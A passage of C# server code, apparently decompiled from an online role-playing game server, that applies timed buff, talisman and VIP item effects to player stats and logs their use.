						base.FLD_人物_追加_经验百分比 += 0.3;
						base.FLD_人物_追加_历练百分比 += 0.3;
						base.FLD_人物_追加_获得游戏币百分比 += 0.2;
						base.FLD_人物_追加_合成成功率百分比 += 0.05;
						base.FLD_人物_追加_贩卖价格百分比 += 0.2;
						base.FLD_人物_追加_吸魂几率百分比 += 15.0;
						base.FLD_人物_追加_武勋获得量百分比 += 0.5;
						base.FLD_人物_追加_物品掉落概率百分比 += 0.2;
						base.FLD_人物_追加_物品掉落概率百分比 += 0.2;
						break;
					}
					Buffer.BlockCopy(BitConverter.GetBytes(yp.时间), 0, array, 11, 4);
					Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
					if (base.Client != null)
					{
						base.Client.Send(array, array.Length);
					}
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "set公有物品出错![" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
			}
		}

		public void 打开符(byte[] 封包数据, int 封包大小)
		{
			try
			{
				if (公有药品.Count >= 2)
				{
					return;
				}
				封包修改(封包数据, 封包大小);
				int num = 封包数据[20];
				byte[] array = new byte[4];
				Buffer.BlockCopy(封包数据, 12, array, 0, 4);
				int itmeid = Converter.getItmeid(Converter.ToString(array));
				switch (itmeid)
				{
				case 1008000058:
					if (BitConverter.ToInt32(装备栏包裹[num].物品ID, 0) == 1008000058 && !检查符2())
					{
						DateTime value15 = new DateTime(1970, 1, 1, 8, 0, 0);
						TimeSpan timeSpan15 = DateTime.Now.AddDays(10.0).Subtract(value15);
						公有药品类 公有药品类16 = new 公有药品类
						{
							药品ID = itmeid,
							时间 = (uint)timeSpan15.TotalSeconds
						};
						公有药品.TryAdd(公有药品类16.药品ID, 公有药品类16);
						set公有物品(公有药品类16);
						减去物品(num, 1);
						RxjhClass.药品记录(base.Userid, base.UserName, 公有药品类16.药品ID, "无极金尊符(10天)", 1);
					}
					break;
				case 1008000059:
					if (BitConverter.ToInt32(装备栏包裹[num].物品ID, 0) == 1008000059 && !检查符())
					{
						DateTime value2 = new DateTime(1970, 1, 1, 8, 0, 0);
						TimeSpan timeSpan2 = DateTime.Now.AddDays(10.0).Subtract(value2);
						公有药品类 公有药品类3 = new 公有药品类
						{
							药品ID = itmeid,
							时间 = (uint)timeSpan2.TotalSeconds
						};
						公有药品.TryAdd(公有药品类3.药品ID, 公有药品类3);
						set公有物品(公有药品类3);
						减去物品(num, 1);
						RxjhClass.药品记录(base.Userid, base.UserName, 公有药品类3.药品ID, "天启银尊符(10天)", 1);
					}
					break;
				case 1008000060:
					if (BitConverter.ToInt32(装备栏包裹[num].物品ID, 0) == 1008000060 && !检查符())
					{
						DateTime value13 = new DateTime(1970, 1, 1, 8, 0, 0);
						TimeSpan timeSpan13 = DateTime.Now.AddDays(10.0).Subtract(value13);
						公有药品类 公有药品类14 = new 公有药品类
						{
							药品ID = itmeid,
							时间 = (uint)timeSpan13.TotalSeconds
						};
						公有药品.TryAdd(公有药品类14.药品ID, 公有药品类14);
						set公有物品(公有药品类14);
						减去物品(num, 1);
						RxjhClass.药品记录(base.Userid, base.UserName, 公有药品类14.药品ID, "玄武赤炼符(10天)", 1);
					}
					break;
				case 1008000061:
					if (BitConverter.ToInt32(装备栏包裹[num].物品ID, 0) == 1008000061 && !检查符())
					{
						DateTime value8 = new DateTime(1970, 1, 1, 8, 0, 0);
						TimeSpan timeSpan8 = DateTime.Now.AddDays(2.0).Subtract(value8);
						公有药品类 公有药品类9 = new 公有药品类
						{
							药品ID = itmeid,
							时间 = (uint)timeSpan8.TotalSeconds
						};
						公有药品.TryAdd(公有药品类9.药品ID, 公有药品类9);
						set公有物品(公有药品类9);
						减去物品(num, 1);
						增加物品(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(800000005), num, BitConverter.GetBytes(1), new byte[20]);
						RxjhClass.药品记录(base.Userid, base.UserName, 公有药品类9.药品ID, "无极金尊符(2天)", 1);
					}
					break;
				case 1008000062:
					if (BitConverter.ToInt32(装备栏包裹[num].物品ID, 0) == 1008000059 && !检查符())
					{
						DateTime value4 = new DateTime(1970, 1, 1, 8, 0, 0);
						TimeSpan timeSpan4 = DateTime.Now.AddDays(2.0).Subtract(value4);
						公有药品类 公有药品类5 = new 公有药品类
						{
							药品ID = itmeid,
							时间 = (uint)timeSpan4.TotalSeconds
						};
						公有药品.TryAdd(公有药品类5.药品ID, 公有药品类5);
						set公有物品(公有药品类5);
						减去物品(num, 1);
						RxjhClass.药品记录(base.Userid, base.UserName, 公有药品类5.药品ID, "天启银尊符(2天)", 1);
					}
					break;
				case 1008000063:
					if (BitConverter.ToInt32(装备栏包裹[num].物品ID, 0) == 1008000063 && !检查符())
					{
						DateTime value12 = new DateTime(1970, 1, 1, 8, 0, 0);
						TimeSpan timeSpan12 = DateTime.Now.AddDays(2.0).Subtract(value12);
						公有药品类 公有药品类13 = new 公有药品类
						{
							药品ID = itmeid,
							时间 = (uint)timeSpan12.TotalSeconds
						};
						公有药品.TryAdd(公有药品类13.药品ID, 公有药品类13);
						set公有物品(公有药品类13);
						减去物品(num, 1);
						RxjhClass.药品记录(base.Userid, base.UserName, 公有药品类13.药品ID, "礼物玄武赤炼符(2天)", 1);
					}
					break;
				case 1008000027:
					if (BitConverter.ToInt32(装备栏包裹[num].物品ID, 0) == 1008000027 && !检查符())
					{
						DateTime value3 = new DateTime(1970, 1, 1, 8, 0, 0);
						TimeSpan timeSpan3 = DateTime.Now.AddDays(30.0).Subtract(value3);
						公有药品类 公有药品类4 = new 公有药品类
						{
							药品ID = itmeid,
							时间 = (uint)timeSpan3.TotalSeconds
						};
						公有药品.TryAdd(公有药品类4.药品ID, 公有药品类4);
						set公有物品(公有药品类4);
						减去物品(num, 1);
						RxjhClass.药品记录(base.Userid, base.UserName, 公有药品类4.药品ID, "无极金尊符(30天)", 1);
					}
					break;
				case 1008000028:
					if (BitConverter.ToInt32(装备栏包裹[num].物品ID, 0) == 1008000028 && !检查符())
					{
						DateTime value7 = new DateTime(1970, 1, 1, 8, 0, 0);
						TimeSpan timeSpan7 = DateTime.Now.AddDays(30.0).Subtract(value7);
						公有药品类 公有药品类8 = new 公有药品类
						{
							药品ID = itmeid,
							时间 = (uint)timeSpan7.TotalSeconds
						};
						公有药品.TryAdd(公有药品类8.药品ID, 公有药品类8);
						set公有物品(公有药品类8);
						减去物品(num, 1);
						增加物品(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(800000005), num, BitConverter.GetBytes(1), new byte[20]);
						RxjhClass.药品记录(base.Userid, base.UserName, 公有药品类8.药品ID, "天启银尊符(30天)", 1);
					}
					break;
				case 1008000029:
					if (BitConverter.ToInt32(装备栏包裹[num].物品ID, 0) == 1008000029 && !检查符())
					{
						DateTime value17 = new DateTime(1970, 1, 1, 8, 0, 0);
						TimeSpan timeSpan17 = DateTime.Now.AddDays(30.0).Subtract(value17);
						公有药品类 公有药品类18 = new 公有药品类
						{
							药品ID = itmeid,
							时间 = (uint)timeSpan17.TotalSeconds
						};
						公有药品.TryAdd(公有药品类18.药品ID, 公有药品类18);
						set公有物品(公有药品类18);
						减去物品(num, 1);
						增加物品(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(800000005), num, BitConverter.GetBytes(1), new byte[20]);
						RxjhClass.药品记录(base.Userid, base.UserName, 公有药品类18.药品ID, "玄武赤炼符(30天)", 1);
					}
					break;
				case 1008000141:
					if (BitConverter.ToInt32(装备栏包裹[num].物品ID, 0) == 1008000141 && !检查符2())
					{
						DateTime value5 = new DateTime(1970, 1, 1, 8, 0, 0);
						TimeSpan timeSpan5 = DateTime.Now.AddDays(10.0).Subtract(value5);
						公有药品类 公有药品类6 = new 公有药品类
						{
							药品ID = itmeid,
							时间 = (uint)timeSpan5.TotalSeconds
						};
						公有药品.TryAdd(公有药品类6.药品ID, 公有药品类6);
						set公有物品(公有药品类6);
						减去物品(num, 1);
						RxjhClass.药品记录(base.Userid, base.UserName, 公有药品类6.药品ID, "至尊符(10天)", 1);
					}
					break;
				case 1008000140:
					if (BitConverter.ToInt32(装备栏包裹[num].物品ID, 0) == 1008000140 && !检查符2())
					{
						DateTime value11 = new DateTime(1970, 1, 1, 8, 0, 0);
						TimeSpan timeSpan11 = DateTime.Now.AddDays(1.0).Subtract(value11);
						公有药品类 公有药品类12 = new 公有药品类
						{
							药品ID = itmeid,
							时间 = (uint)timeSpan11.TotalSeconds
						};
						公有药品.TryAdd(公有药品类12.药品ID, 公有药品类12);
						set公有物品(公有药品类12);
						减去物品(num, 1);
						RxjhClass.药品记录(base.Userid, base.UserName, 公有药品类12.药品ID, "至尊符(1天)", 1);
					}
					break;
				case 1008000124:
					if (BitConverter.ToInt32(装备栏包裹[num].物品ID, 0) == 1008000124 && !检查符2())
					{
						DateTime value9 = new DateTime(1970, 1, 1, 8, 0, 0);
						TimeSpan timeSpan9 = DateTime.Now.AddDays(30.0).Subtract(value9);
						公有药品类 公有药品类10 = new 公有药品类
						{
							药品ID = itmeid,
							时间 = (uint)timeSpan9.TotalSeconds
						};
						公有药品.TryAdd(公有药品类10.药品ID, 公有药品类10);
						set公有物品(公有药品类10);
						减去物品(num, 1);
						RxjhClass.药品记录(base.Userid, base.UserName, 公有药品类10.药品ID, "至尊符(30天)", 1);
					}
					break;
				case 1008000318:
					if (BitConverter.ToInt32(装备栏包裹[num].物品ID, 0) == 1008000318 && !检查符2())
					{
						DateTime value16 = new DateTime(1970, 1, 1, 8, 0, 0);
						TimeSpan timeSpan16 = DateTime.Now.AddDays(1.0).Subtract(value16);
						公有药品类 公有药品类17 = new 公有药品类
						{
							药品ID = itmeid,
							时间 = (uint)timeSpan16.TotalSeconds
						};
						公有药品.TryAdd(公有药品类17.药品ID, 公有药品类17);
						set公有物品(公有药品类17);
						减去物品(num, 1);
						RxjhClass.药品记录(base.Userid, base.UserName, 公有药品类17.药品ID, "至尊热血符(1天)", 1);
					}
					break;
				case 1008000312:
					if (BitConverter.ToInt32(装备栏包裹[num].物品ID, 0) == 1008000312 && !检查符2())
					{
						DateTime value10 = new DateTime(1970, 1, 1, 8, 0, 0);
						TimeSpan timeSpan10 = DateTime.Now.AddDays(30.0).Subtract(value10);
						公有药品类 公有药品类11 = new 公有药品类
						{
							药品ID = itmeid,
							时间 = (uint)timeSpan10.TotalSeconds
						};
						公有药品.TryAdd(公有药品类11.药品ID, 公有药品类11);
						set公有物品(公有药品类11);
						减去物品(num, 1);
						RxjhClass.药品记录(base.Userid, base.UserName, 公有药品类11.药品ID, "至尊热血符(30天)", 1);
					}
					break;
				case 1008000311:
					if (BitConverter.ToInt32(装备栏包裹[num].物品ID, 0) == 1008000311 && !检查符2())
					{
						DateTime value6 = new DateTime(1970, 1, 1, 8, 0, 0);
						TimeSpan timeSpan6 = DateTime.Now.AddDays(30.0).Subtract(value6);
						公有药品类 公有药品类7 = new 公有药品类
						{
							药品ID = itmeid,
							时间 = (uint)timeSpan6.TotalSeconds
						};
						公有药品.TryAdd(公有药品类7.药品ID, 公有药品类7);
						set公有物品(公有药品类7);
						减去物品(num, 1);
						RxjhClass.药品记录(base.Userid, base.UserName, 公有药品类7.药品ID, "热血符(30天)", 1);
					}
					break;
				case 1008001584:
					物品使用(1, num, 1);
					if (base.FLD_VIP != 0)
					{
						base.FLD_VIPTIM = base.FLD_VIPTIM.AddDays(30.0);
					}
					else
					{
						base.FLD_VIP = 1;
						base.FLD_VIPTIM = DateTime.Now.AddDays(30.0);
					}
					系统提示("您的VIP到期时间为:" + base.FLD_VIPTIM.ToString());
					保存会员数据();
					break;
				case 1008000877:
					if (BitConverter.ToInt32(装备栏包裹[num].物品ID, 0) == 1008000877 && !检查符2())
					{
						DateTime value14 = new DateTime(1970, 1, 1, 8, 0, 0);
						TimeSpan timeSpan14 = DateTime.Now.AddDays(1.0).Subtract(value14);
						公有药品类 公有药品类15 = new 公有药品类
						{
							药品ID = itmeid,
							时间 = (uint)timeSpan14.TotalSeconds
						};
						公有药品.TryAdd(公有药品类15.药品ID, 公有药品类15);
						set公有物品(公有药品类15);
						减去物品(num, 1);
						RxjhClass.药品记录(base.Userid, base.UserName, 公有药品类15.药品ID, "热血符(活动)", 1);
					}
					break;
				case 1008000320:
					if (BitConverter.ToInt32(装备栏包裹[num].物品ID, 0) == 1008000320 && !检查符2())
					{
						DateTime value = new DateTime(1970, 1, 1, 8, 0, 0);
						TimeSpan timeSpan = DateTime.Now.AddDays(10.0).Subtract(value);
						公有药品类 公有药品类2 = new 公有药品类
						{
							药品ID = itmeid,
							时间 = (uint)timeSpan.TotalSeconds
						};
						公有药品.TryAdd(公有药品类2.药品ID, 公有药品类2);
						set公有物品(公有药品类2);
						减去物品(num, 1);
						RxjhClass.药品记录(base.Userid, base.UserName, 公有药品类2.药品ID, "至尊热血符(10天)", 1);
					}
					break;
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "打开符出错![" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
			}
		}

		public void Set追加状态物品()
		{
			if (追加状态物品New == null || 追加状态物品New.Length == 1)
			{
				return;
			}
			try
			{
				for (int i = 0; i < 15 && 追加状态物品New.Length >= (i + 1) * 16; i++)
				{
					byte[] array = new byte[4];
					byte[] array2 = new byte[4];
					byte[] array3 = new byte[4];
					byte[] array4 = new byte[4];
					Buffer.BlockCopy(追加状态物品New, i * 16, array, 0, 4);
					if (BitConverter.ToInt32(array, 0) <= 0)
					{
						continue;
					}
					Buffer.BlockCopy(追加状态物品New, i * 16 + 4, array2, 0, 4);
					if (BitConverter.ToInt32(array2, 0) > 0)
					{
						Buffer.BlockCopy(追加状态物品New, i * 16 + 8, array3, 0, 4);
						if (BitConverter.ToInt32(array3, 0) > 0)
						{
							Buffer.BlockCopy(追加状态物品New, i * 16 + 12, array4, 0, 4);
							Set追加状态物品(BitConverter.ToInt32(array, 0), BitConverter.ToInt32(array2, 0), BitConverter.ToInt32(array3, 0), BitConverter.ToInt32(array4, 0));
						}
					}
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "Set追加状态物品出错![" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
			}
		}

		public void Set追加状态物品(int FLD_PID, int 时间, int 数量, int 数量类型)
		{
			try
			{
				switch (FLD_PID)
				{
				case 1:
				{
					if (GetAddStateNew(FLD_PID))
					{
						追加状态New列表[FLD_PID].时间结束事件();
					}
					追加状态New类 value6 = new 追加状态New类(this, FLD_PID, 时间, 数量, 数量类型);
					追加状态New列表.Add(FLD_PID, value6);
					switch (数量类型)
					{
					case 2:
						addFLD_追加百分比_攻击(0.01 * (double)数量);
						break;
					case 1:
						base.FLD_人物_追加_攻击 += 数量;
						break;
					}
					break;
				}
				case 2:
				{
					if (GetAddStateNew(FLD_PID))
					{
						追加状态New列表[FLD_PID].时间结束事件();
					}
					追加状态New类 value2 = new 追加状态New类(this, FLD_PID, 时间, 数量, 数量类型);
					追加状态New列表.Add(FLD_PID, value2);
					switch (数量类型)
					{
					case 2:
						addFLD_追加百分比_防御(0.01 * (double)数量);
						break;
					case 1:
						base.FLD_人物_追加_防御 += 数量;
						break;
					}
					break;
				}
				case 3:
				{
					if (GetAddStateNew(FLD_PID))
					{
						追加状态New列表[FLD_PID].时间结束事件();
					}
					追加状态New类 value15 = new 追加状态New类(this, FLD_PID, 时间, 数量, 数量类型);
					追加状态New列表.Add(FLD_PID, value15);
					switch (数量类型)
					{
					case 2:
						base.FLD_追加百分比_HP上限 += 0.01 * (double)数量;
						break;
					case 1:
						base.人物追加最大_HP += 数量;
						break;
					}
					break;
				}
				case 4:
				{
					if (GetAddStateNew(FLD_PID))
					{
						追加状态New列表[FLD_PID].时间结束事件();
					}
					追加状态New类 value8 = new 追加状态New类(this, FLD_PID, 时间, 数量, 数量类型);
					追加状态New列表.Add(FLD_PID, value8);
					switch (数量类型)
					{
					case 2:
						base.FLD_追加百分比_MP上限 += 0.01 * (double)数量;
						break;
					case 1:
						base.人物追加最大_MP += 数量;
						break;
					}
					break;
				}
				case 5:
				{
					if (GetAddStateNew(FLD_PID))
					{
						追加状态New列表[FLD_PID].时间结束事件();
					}
					追加状态New类 value5 = new 追加状态New类(this, FLD_PID, 时间, 数量, 数量类型);
					追加状态New列表.Add(FLD_PID, value5);
					switch (数量类型)
					{
					case 2:
						base.FLD_追加百分比_命中 += 0.01 * (double)数量;
						break;
					case 1:
						base.FLD_人物_追加_命中 += 数量;
						break;
					}
					break;
				}
				case 6:
				{
					if (GetAddStateNew(FLD_PID))
					{
						追加状态New列表[FLD_PID].时间结束事件();
					}
					追加状态New类 value7 = new 追加状态New类(this, FLD_PID, 时间, 数量, 数量类型);
					追加状态New列表.Add(FLD_PID, value7);
					switch (数量类型)
					{
					case 2:
						base.FLD_人物_追加百分比_回避 += 0.01 * (double)数量;
						break;
					case 1:
						base.FLD_人物_追加_回避 += 数量;
						break;
					}
					break;
				}
				case 7:
				{
					if (GetAddStateNew(FLD_PID))
					{
						追加状态New列表[FLD_PID].时间结束事件();
					}
					追加状态New类 value12 = new 追加状态New类(this, FLD_PID, 时间, 数量, 数量类型);
					追加状态New列表.Add(FLD_PID, value12);
					if (数量类型 == 2)
					{
						base.FLD_人物_武功攻击力增加百分比 += 0.01 * (double)数量;
					}
					break;
				}
				case 8:
				{
					if (GetAddStateNew(FLD_PID))
					{
						追加状态New列表[FLD_PID].时间结束事件();
					}
					追加状态New类 value10 = new 追加状态New类(this, FLD_PID, 时间, 数量, 数量类型);
					追加状态New列表.Add(FLD_PID, value10);
					switch (数量类型)
					{
					case 2:
						base.FLD_人物_武功防御力增加百分比 += 0.01 * (double)数量;
						break;
					case 1:
						base.FLD_人物_追加_回避 += 数量;
						break;
					}
					break;
				}
				case 9:
				{
					if (GetAddStateNew(FLD_PID))
					{
						追加状态New列表[FLD_PID].时间结束事件();
					}
					追加状态New类 value3 = new 追加状态New类(this, FLD_PID, 时间, 数量, 数量类型);
					追加状态New列表.Add(FLD_PID, value3);
					if (数量类型 == 2)
					{
						base.FLD_人物_追加_经验百分比 += 0.01 * (double)数量;
					}
					break;
				}
				case 10:
				{
					if (GetAddStateNew(FLD_PID))
					{
						追加状态New列表[FLD_PID].时间结束事件();
					}
					追加状态New类 value13 = new 追加状态New类(this, FLD_PID, 时间, 数量, 数量类型);
					追加状态New列表.Add(FLD_PID, value13);
					if (数量类型 == 2)
					{
						base.FLD_人物_追加_合成成功率百分比 += 0.01 * (double)数量;
					}
					break;
				}
				case 11:
				{
					if (GetAddStateNew(FLD_PID))
					{
						追加状态New列表[FLD_PID].时间结束事件();
					}
					追加状态New类 value9 = new 追加状态New类(this, FLD_PID, 时间, 数量, 数量类型);
					追加状态New列表.Add(FLD_PID, value9);
					break;
				}
				case 12:
				{
					if (GetAddStateNew(FLD_PID))
					{
						追加状态New列表[FLD_PID].时间结束事件();
					}
					追加状态New类 value4 = new 追加状态New类(this, FLD_PID, 时间, 数量, 数量类型);
					追加状态New列表.Add(FLD_PID, value4);
					if (数量类型 == 2)
					{
						base.FLD_人物_追加_获得游戏币百分比 += 0.01 * (double)数量;
					}
					break;
				}
				case 13:
				{
					if (GetAddStateNew(FLD_PID))
					{
						追加状态New列表[FLD_PID].时间结束事件();
					}
					追加状态New类 value14 = new 追加状态New类(this, FLD_PID, 时间, 数量, 数量类型);
					追加状态New列表.Add(FLD_PID, value14);
					if (数量类型 == 2)
					{
						base.FLD_人物_追加_物品掉落概率百分比 += 0.01 * (double)数量;
					}
					break;
				}
				case 14:
				{
					if (GetAddStateNew(FLD_PID))
					{
						追加状态New列表[FLD_PID].时间结束事件();
					}
					追加状态New类 value11 = new 追加状态New类(this, FLD_PID, 时间, 数量, 数量类型);
					追加状态New列表.Add(FLD_PID, value11);
					base.FLD_人物_追加_气功 += 数量;
					更新气功();
					break;
				}
				case 15:
				{
					if (GetAddStateNew(FLD_PID))
					{
						追加状态New列表[FLD_PID].时间结束事件();
					}
					追加状态New类 value = new 追加状态New类(this, FLD_PID, 时间, 数量, 数量类型);
					追加状态New列表.Add(FLD_PID, value);
					if (数量类型 == 2)
					{
						base.FLD_人物_追加_历练百分比 += 0.01 * (double)数量;
					}
					break;
				}
				}
				状态效果New(FLD_PID, 1, 时间, 数量, 数量类型);
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "Set追加状态物品2 出错：[" + FLD_PID + "]" + ex);
			}
		}

		public int 获取背包物品位置(int ID)
		{
			int num = 0;
			while (true)
			{
				if (num < 36)
				{
					if (BitConverter.ToInt32(装备栏包裹[num].物品ID, 0) == ID)
					{
						break;
					}
					num++;
					continue;
				}
				return -1;
			}
			return num;
		}

		public void set特殊物品()
		{
			ConcurrentDictionary<int, 特殊药品类> concurrentDictionary = new ConcurrentDictionary<int, 特殊药品类>();
			foreach (特殊药品类 value2 in 特殊药品.Values)
			{
				if (value2.时间 > uint.Parse(DateTime.Now.ToString("yyMMddHHmm")))
				{
					set特殊物品(value2);
				}
				else
				{
					concurrentDictionary.TryAdd(value2.药品ID, value2);
				}
			}
			foreach (特殊药品类 value3 in concurrentDictionary.Values)
			{
				特殊药品.TryRemove(value3.药品ID, out var _);
			}
		}

		public void set特殊物品(特殊药品类 药品)
		{
			try
			{
				if (药品.时间 == 2147483648u)
				{
					药品.时间 = 2201010800u;
				}
				switch (药品.药品ID)
				{
				case 1008000142:
					药品新效果(药品.药品ID, 1, 药品.时间, (uint)(DateTime.ParseExact(药品.时间.ToString(), "yyMMddHHmm", CultureInfo.CurrentCulture) - DateTime.Now).TotalMinutes);
					break;
				case 1000001150:
				{
					DateTime d = DateTime.ParseExact(药品.时间.ToString(), "yyMMddHHmm", CultureInfo.CurrentCulture);
					DateTime now = DateTime.Now;
					药品新效果(1000001150, 1, 药品.时间, (uint)(d - now).TotalMinutes);
					break;
				}
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "set时间物品出错![" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
			}
		}

		public void set时间物品()
		{
			ConcurrentDictionary<int, 时间药品类> concurrentDictionary = new ConcurrentDictionary<int, 时间药品类>();
			foreach (时间药品类 value2 in 时间药品.Values)
			{
				if (value2.时间 > uint.Parse(DateTime.Now.ToString("yyMMddHHmm")))
				{
					set时间物品(value2);
				}
				else
				{
					concurrentDictionary.TryAdd(value2.药品ID, value2);
				}
			}
			foreach (时间药品类 value3 in concurrentDictionary.Values)
			{
				时间药品.TryRemove(value3.药品ID, out var _);
			}
		}

		public void set时间物品(时间药品类 药品)
		{
			try
			{
				if (药品.时间 == 2147483648u)
				{
					药品.时间 = 2201010800u;
				}
				switch (药品.药品ID)
				{
				case 1100004:
				case 1008001040:
				case 1008002054:
					药品新效果(药品.药品ID, 1, 药品.时间, (uint)(DateTime.ParseExact(药品.时间.ToString(), "yyMMddHHmm", CultureInfo.CurrentCulture) - DateTime.Now).TotalMinutes);
					break;
				case 1008001994:
				{
					TimeSpan timeSpan2 = DateTime.ParseExact(药品.时间.ToString(), "yyMMddHHmm", CultureInfo.CurrentCulture) - DateTime.Now;
					萌犬表情效果(药品.药品ID, 1, 药品.时间, (uint)timeSpan2.TotalMinutes);
					药品新效果(药品.药品ID, 1, 药品.时间, (uint)timeSpan2.TotalMinutes);
					break;
				}
				case 1008001993:
				{
					TimeSpan timeSpan = DateTime.ParseExact(药品.时间.ToString(), "yyMMddHHmm", CultureInfo.CurrentCulture) - DateTime.Now;
					萌犬表情效果(药品.药品ID, 1, 药品.时间, (uint)timeSpan.TotalMinutes);
					药品新效果(药品.药品ID, 1, 药品.时间, (uint)timeSpan.TotalMinutes);
					break;
				}
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "set时间物品出错![" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
			}
		}

		public void Set个人药品()
		{
			try
			{
				if (个人药品 == null || 个人药品.Length == 1)
				{
					return;
				}
				for (int i = 0; i < 40 && 个人药品.Length >= (i + 1) * 8; i++)
				{
					byte[] array = new byte[4];
					byte[] array2 = new byte[4];
					Buffer.BlockCopy(个人药品, i * 8, array, 0, 4);
					Buffer.BlockCopy(个人药品, i * 8 + 4, array2, 0, 4);
					if (BitConverter.ToInt32(array, 0) <= 0 || BitConverter.ToInt32(array2, 0) <= 0)
					{
						continue;
					}
					int num = BitConverter.ToInt32(array, 0);
					int num2 = BitConverter.ToInt32(array2, 0);
					switch (num)
					{
					case 900000046:
					{
						if (GetAddState(num))
						{
							追加状态列表[num].时间结束事件();
						}
						追加状态类 追加状态类58 = new 追加状态类(this, num2, num, 1);
						追加状态列表.Add(追加状态类58.FLD_PID, 追加状态类58);
						状态效果(BitConverter.GetBytes(num), 1, num2);
						base.FLD_人物_追加_攻击 += 60;
						base.FLD_人物_追加_防御 += 60;
						base.人物追加最大_HP += 300;
						break;
					}
					case 9000088:
					case 9000104:
					case 9000105:
					case 9000144:
					case 9000145:
					case 9000168:
					case 9001214:
					case 9009077:
					case 9009092:
					case 9009151:
					case 9009788:
					case 9009789:
					case 9009790:
					case 9009820:
					case 9009964:
					{
						if (追加状态列表.ContainsKey(num))
						{
							追加状态列表[num].时间结束事件();
						}
						状态效果(BitConverter.GetBytes(num), 1, num2);
						追加状态类 追加状态类20 = new 追加状态类(this, num2, num, 1);
						追加状态列表.Add(追加状态类20.FLD_PID, 追加状态类20);
						base.FLD_人物_追加_历练百分比 += 0.5;
						break;
					}
					case 9000085:
					case 9000120:
					case 9000121:
					case 9000165:
					case 9000166:
					case 9000317:
					case 9001207:
					case 9001211:
					case 9001215:
					case 9009076:
					case 9009150:
					case 9009217:
					case 9009309:
					case 9009839:
					case 9009941:
					case 9009943:
					case 9009965:
					case 9009966:
					case 9009970:
					{
						if (追加状态列表.ContainsKey(num))
						{
							追加状态列表[num].时间结束事件();
						}
						状态效果(BitConverter.GetBytes(num), 1, num2);
						追加状态类 追加状态类77 = new 追加状态类(this, num2, num, 1);
						追加状态列表.Add(追加状态类77.FLD_PID, 追加状态类77);
						base.FLD_人物_追加_经验百分比 += 0.2;
						break;
					}
					case 900000047:
					{
						if (GetAddState(num))
						{
							追加状态列表[num].时间结束事件();
						}
						追加状态类 追加状态类48 = new 追加状态类(this, num2, num, 1);
						追加状态列表.Add(追加状态类48.FLD_PID, 追加状态类48);
						状态效果(BitConverter.GetBytes(num), 1, num2);
						base.FLD_人物_追加_攻击 += 100;
						base.FLD_人物_追加_防御 += 100;
						base.人物追加最大_HP += 500;
						break;
					}
					case 900000619:
					{
						安全模式 = 0;
						if (追加状态列表.ContainsKey(num))
						{
							追加状态列表[num].时间结束事件();
						}
						追加状态类 追加状态类53 = new 追加状态类(this, num2, num, 1);
						追加状态列表.Add(追加状态类53.FLD_PID, 追加状态类53);
						状态效果(BitConverter.GetBytes(num), 1, num2);
						安全模式 = 1;
						break;
					}
					case 1000000030:
					{
						if (追加状态列表.ContainsKey(num))
						{
							追加状态列表[num].时间结束事件();
						}
						状态效果(BitConverter.GetBytes(num), 1, num2);
						追加状态类 追加状态类40 = new 追加状态类(this, num2, num, 1);
						追加状态列表.Add(追加状态类40.FLD_PID, 追加状态类40);
						base.FLD_人物_追加_历练百分比 += 1.0;
						break;
					}
					case 999000163:
					{
						追加状态类 追加状态类3 = new 追加状态类(this, num2, num, 1);
						追加状态列表.Add(追加状态类3.FLD_PID, 追加状态类3);
						状态效果(BitConverter.GetBytes(num), 1, num2);
						break;
					}
					case 1000000830:
					{
						if (追加状态列表.ContainsKey(num))
						{
							追加状态列表[num].时间结束事件();
						}
						追加状态类 追加状态类75 = new 追加状态类(this, num2, num, 1);
						追加状态列表.Add(追加状态类75.FLD_PID, 追加状态类75);
						状态效果(BitConverter.GetBytes(num), 1, num2);
						base.人物追加最大_HP += 100;
						break;
					}
					case 1000000831:
					{
						if (追加状态列表.ContainsKey(num))
						{
							追加状态列表[num].时间结束事件();
						}
						追加状态类 追加状态类27 = new 追加状态类(this, num2, num, 1);
						追加状态列表.Add(追加状态类27.FLD_PID, 追加状态类27);
						状态效果(BitConverter.GetBytes(num), 1, num2);
						base.人物追加最大_HP += 50;
						break;
					}
					case 1000000832:
					{
						if (追加状态列表.ContainsKey(num))
						{
							追加状态列表[num].时间结束事件();
						}
						追加状态类 追加状态类7 = new 追加状态类(this, num2, num, 1);
						追加状态列表.Add(追加状态类7.FLD_PID, 追加状态类7);
						状态效果(BitConverter.GetBytes(num), 1, num2);
						base.人物追加最大_HP += 100;
						base.人物追加最大_MP += 100;
						break;
					}
					case 1000000835:
					{
						if (追加状态列表.ContainsKey(num))
						{
							追加状态列表[num].时间结束事件();
						}
						追加状态类 追加状态类71 = new 追加状态类(this, num2, num, 1);
						追加状态列表.Add(追加状态类71.FLD_PID, 追加状态类71);
						状态效果(BitConverter.GetBytes(num), 1, num2);
						base.FLD_追加百分比_MP上限 += 0.05;
						break;
					}
					case 1000000836:
					{
						if (追加状态列表.ContainsKey(num))
						{
							追加状态列表[num].时间结束事件();
						}
						追加状态类 追加状态类67 = new 追加状态类(this, num2, num, 1);
						追加状态列表.Add(追加状态类67.FLD_PID, 追加状态类67);
						状态效果(BitConverter.GetBytes(num), 1, num2);
						base.FLD_追加百分比_HP上限 += 0.05;
						break;
					}
					case 1000000408:
					{
						if (GetAddState(num))
						{
							追加状态列表[num].时间结束事件();
						}
						追加状态类 追加状态类31 = new 追加状态类(this, num2, num, 1);
						追加状态列表.Add(追加状态类31.FLD_PID, 追加状态类31);
						状态效果(BitConverter.GetBytes(num), 1, num2);
						addFLD_追加百分比_攻击(0.1);
						break;
					}
					case 1000000409:
					{
						if (GetAddState(num))
						{
							追加状态列表[num].时间结束事件();
						}
